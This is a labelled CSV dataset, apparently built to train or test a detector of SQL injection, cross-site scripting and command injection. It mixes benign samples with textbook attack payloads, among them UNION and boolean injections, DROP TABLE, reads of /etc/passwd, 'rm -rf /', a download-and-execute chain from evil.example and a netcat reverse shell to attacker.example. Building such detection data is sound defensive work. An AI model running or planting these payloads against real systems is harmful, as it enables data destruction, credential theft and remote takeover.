id,payload,label,notes
1,"SELECT id, name FROM products WHERE id=42;","benign","Typical benign query"
2,"SELECT * FROM users WHERE username='admin' AND password='password';","benign","Hardcoded credentials (bad practice but not an injection payload)"
3,"SELECT * FROM users WHERE username='' OR '1'='1';","sql_injection","Classic boolean-based SQLi"
4,"SELECT id, name FROM users WHERE username = '' UNION SELECT username, password FROM admin --';","sql_injection","UNION-based SQLi"
5,"DROP TABLE users;","sql_injection","Destructive SQL command"
6,"INSERT INTO users (name,password) VALUES ('attacker','pwned');","sql_injection","Malicious insertion"
7,"SELECT * FROM accounts WHERE account = '123' -- and balance > 0","sql_injection","Comment truncation"
8,"%27%20OR%20%271%27%3D%271","sql_injection","URL-encoded payload for web inputs"
9,"<script>alert('XSS')</script>","xss","Basic reflected XSS"
10,"<img src=x onerror=alert(1)>","xss","Event handler XSS"
11,"javascript:alert(1)","xss","javascript: URI"
12,"<iframe src=""http://attacker.example.com""></iframe>","xss","iframe injection"
13,"<div>Welcome, user</div>","benign","Simple HTML fragment"
14,"rm -rf /","cmd_injection","Destructive shell command"
15,"; wget http://evil.example/payload.sh -O /tmp/p.sh; sh /tmp/p.sh","cmd_injection","Chained shell download+execute"
16,"|| nc -e /bin/sh attacker.example 4444","cmd_injection","Netcat reverse shell pattern"
17,"`; cat /etc/passwd`","cmd_injection","Backtick command injection"
18,"curl -I https://example.com","benign","Network tool usage (benign)"
19,"SELECT name FROM users WHERE id = ?","benign","Parameterized query (good practice)"
20,"(select load_file('/etc/passwd'))","sql_injection","File read via SQL"
21,"<svg onload=alert(1)>","xss","SVG attribute XSS"
22,"%3Cscript%3Ealert(1)%3C%2Fscript%3E","xss","URL-encoded XSS"
23,"' OR 1=1 -- ","sql_injection","Simplified SQLi with comment"
24,"admin' /*'*/ OR '1'='1","sql_injection","Obfuscated SQLi payload"
25,"username=foo&password=bar","benign","Form-style payload (URL-encoded body example)"
26,"SELECT * FROM products WHERE name LIKE '%</script>%'","benign","Contains XSS-like substring but part of SQL"
27,"<a href=""javascript:evil()"">click</a>","xss","Anchor with javascript: URI"
28,"echo 'hello' > /tmp/out.txt","benign","Simple shell redirection (could be benign)"
29,"(sleep 10)--","sql_injection","Time-based injection attempt (DB sleep)"
30,"正常なクエリ SELECT * FROM users;","benign","Unicode / multilingual payload"
